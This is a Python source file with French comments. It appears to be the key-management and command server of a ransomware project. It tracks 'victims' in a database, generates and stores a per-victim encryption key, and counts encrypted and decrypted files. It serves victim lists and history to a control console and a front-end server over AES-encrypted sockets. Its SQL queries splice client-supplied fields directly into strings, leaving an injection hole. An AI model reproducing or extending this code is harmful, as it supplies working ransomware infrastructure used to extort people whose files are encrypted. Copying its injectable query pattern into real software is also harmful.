import queue
import threading
import utile.data as data
import utile.message as message
import utile.network as net
import utile.security as secu
THREADS_QUEUE = {'CONTROLE': '', 'FRONTAL': ''}


# Lancement du serveur clé écoutant (de base) en local sur le port 8380
def Console_Controle(FIFO_message_type):
    socket_serv = net.start_net_serv_client()
    FIFO_resp = queue.Queue()
    THREADS_QUEUE['CONTROLE'] = FIFO_resp
    while True:
        conn, addr = socket_serv.accept()
        key = secu.Diffie_Hellman_exchange_key(conn)
        print(
            f'[+] CONSOLE CONTROLE | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        while True:
            try:
                recv_data = net.receive_message(conn)
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                FIFO_message_type.put([recv_data, 'CONTROLE'])
            except:
                conn.close()
                print('[+] Déconnexion de la Console_Controle')
                break
            while True:
                packet = FIFO_resp.get()
                FIFO_resp.task_done()
                packet_encrypted = secu.AES_GCM_encrypt(packet, key)
                net.send_message(conn, packet_encrypted)
                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                        packet) == 'LIST_VICTIM_END':
                    break


def Serveur_Frontal(FIFO_message_type):
    socket_serv = net.start_net_serv_client(port=8381)
    FIFO_resp = queue.Queue()
    THREADS_QUEUE['FRONTAL'] = FIFO_resp
    while True:
        conn, addr = socket_serv.accept()
        key = secu.Diffie_Hellman_exchange_key(conn)
        print(
            f'[+] SERVEUR FRONTAL | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')

        while True:
            try:
                recv_data = net.receive_message(conn)
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                FIFO_message_type.put([recv_data, 'FRONTAL'])
            except:
                conn.close()
                print('[+] Déconnexion du Serveur Frontal')
                break
            while True:
                packet = FIFO_resp.get()
                FIFO_resp.task_done()
                packet_encrypt = secu.AES_GCM_encrypt(packet, key)
                net.send_message(conn, packet_encrypt)
                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                        packet) == 'LIST_VICTIM_END' or message.get_message_type(packet) == 'INITIALIZE_RESP':
                    break


def ThreadMaster(FIFO_message_type):
    while True:
        recv_data, id_thread = FIFO_message_type.get()
        FIFO_resp = THREADS_QUEUE[id_thread]
        message_type = message.get_message_type(recv_data)
        if message_type == 'LIST_VICTIM_REQ':
            # execution de la fonction get_victim_list() pour plus d'informations -> voir data.py
            result_pending, result_protected, result_other = data.get_victim_list()

            # Pour chaque victime, l'envoie vers le client
            for victim in result_pending:
                list_victim_resp1 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp1)
                FIFO_resp.join()

            for victim in result_protected:
                list_victim_resp2 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp2)
                FIFO_resp.join()

            for victim in result_other:
                list_victim_resp3 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp3)
                FIFO_resp.join()

            # envoie d'un LIST_VICTIM_END pour indiquer la fin
            list_victim_end = message.set_message("LIST_VICTIM_END")
            FIFO_resp.put(list_victim_end)
            FIFO_resp.join()

        elif message_type == 'HISTORY_REQ':
            # Execution de la fonction get_history() pour plus d'informations -> voir data.py
            result = data.get_history(recv_data)
            # Envoi du résultat
            history_resp = message.set_message('HISTORY_RESP', result[0])
            history_end = message.set_message('HISTORY_END', [recv_data['HIST_REQ']])
            FIFO_resp.put(history_resp)
            FIFO_resp.put(history_end)
            FIFO_resp.join()

        elif message_type == 'CHANGE_STATE':
            data.change_state(recv_data)

        elif message_type == 'INITIALIZE_REQ':
            conn, cursor = data.connect_to_DB()
            if not data.execute_query(conn, cursor, f'SELECT hash, os, disks FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"'):
                query_victims = f'INSERT INTO victims(hash, os, disks, key )VALUES("{recv_data["INITIALIZE"]}", "{recv_data["OS"]}", "{recv_data["DISKS"]}", "{secu.generated_encrypted_key()}") '
                data.execute_query(conn, cursor, query_victims)
                victim_identity = data.execute_query(conn, cursor,
                                                     f'SELECT id_victim FROM victims WHERE hash ="{recv_data["INITIALIZE"]}"')
                query_states = f'INSERT INTO states(id_victim, state)VALUES({victim_identity[0][0]}, "INITIALIZE")'
                query_encrypted = f'INSERT INTO encrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'
                query_decrypted = f'INSERT INTO decrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'

                data.execute_query(conn, cursor, query_states)
                data.execute_query(conn, cursor, query_encrypted)
                data.execute_query(conn, cursor, query_decrypted)
            list_info= data.execute_query(conn, cursor, f'SELECT v.id_victim, v.key, s.state FROM victims v JOIN states s ON s.id_victim = v.id_victim WHERE v.hash = "{recv_data["INITIALIZE"]}"')
            id_victim, key, state = list_info[0]
            FIFO_resp.put(message.set_message('INITIALIZE_KEY', [id_victim, key, state]))







def main():
    FIFO_message_type = queue.Queue()

    # création des threads
    Serveur_Frontal_thread = threading.Thread(target=Serveur_Frontal, args=(FIFO_message_type,))
    Console_Controle_thread = threading.Thread(target=Console_Controle, args=(FIFO_message_type,))

    # Lancement des threads
    Console_Controle_thread.start()
    Serveur_Frontal_thread.start()

    # Lancement du threadMaster
    ThreadMaster(FIFO_message_type)


if __name__ == '__main__':
    main()
